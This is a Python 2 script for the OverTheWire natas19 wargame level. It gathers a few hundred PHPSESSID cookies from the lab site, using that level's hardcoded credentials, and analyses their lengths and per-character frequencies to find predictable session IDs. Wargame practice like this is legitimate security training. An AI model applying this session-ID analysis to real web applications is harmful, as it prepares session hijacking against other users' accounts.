#!/usr/bin/env python

import requests
import os.path
import sys

def collect_stat(phpsessid, sess_id):
    for i in xrange(0, len(sess_id)):
        char_at_pos = phpsessid[i]
        char_at_pos[sess_id[i]] += 1

def get_max(chars={}):
    max_freq = 0
    max_char = 'a'
    for c in chars:
        if chars[c] >= max_freq:
            max_freq = chars[c]
            max_char = c
    return max_char, max_freq

def print_stat(phpsessid, n_captures):
    i = 0
    for c in phpsessid:
        l, f = get_max(c)
        print (("  char at position %2.1d of PHPSESSID is '%c' with accurancy %2.2f%%") %
               (i, l, (f*100)/n_captures))
        i += 1

target = 'http://natas19.natas.labs.overthewire.org'
auth = ('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
params = dict(username='admin', password='s3cr3t')
cookies = dict()

# collects PHPSESSIDs
filename = './phpsessids.txt'
i_max = 300
i = 0

if os.path.exists(filename) is False:
    f = open(filename, 'a')
    print 'Collecting data (%d requests)' % i_max
    while i <= i_max:
        r = requests.get(target, auth=auth, params=params, cookies=cookies)
        f.write('%s\n' % r.cookies['PHPSESSID'])
        i += 1
        sys.stderr.write('.')
    f.close()
    sys.stderr.write('\n\n')

# analyses collected IDs
lens = {}
ids = []
with open(filename) as f: ids = f.readlines()
tot = len(ids)

for id in ids:
    k = str(len(id[:-1]))
    if k in lens:
        lens[k] += 1
    else:
        lens[k] = 1

print "Just a simple analysis: "
for k in lens:
    print ('  PHPSESSIDs with %s chars: %2.2f%%') % (k, (int(lens[k]) * 100)/tot)

print ""

# analyses chars frequencies
sys.stdout.write('Chose length: ')
l = int(raw_input())

phpsessid = []

for i in xrange(0, l):
    phpsessid.append({'0': 0, '1': 0, '2': 0, '3': 0, '4': 0, '5': 0, '6': 0,
                      '7': 0, '8': 0, '9': 0, 'a': 0, 'b': 0, 'c': 0, 'd': 0,
                      'e': 0, 'f': 0})

n_captures = 0

if l is not None:
    for id in ids:
        if len(id[:-1]) == l:
            collect_stat(phpsessid, id[:-1])
            n_captures += 1
print "\nWith %d captures" % i_max
print_stat(phpsessid, n_captures)
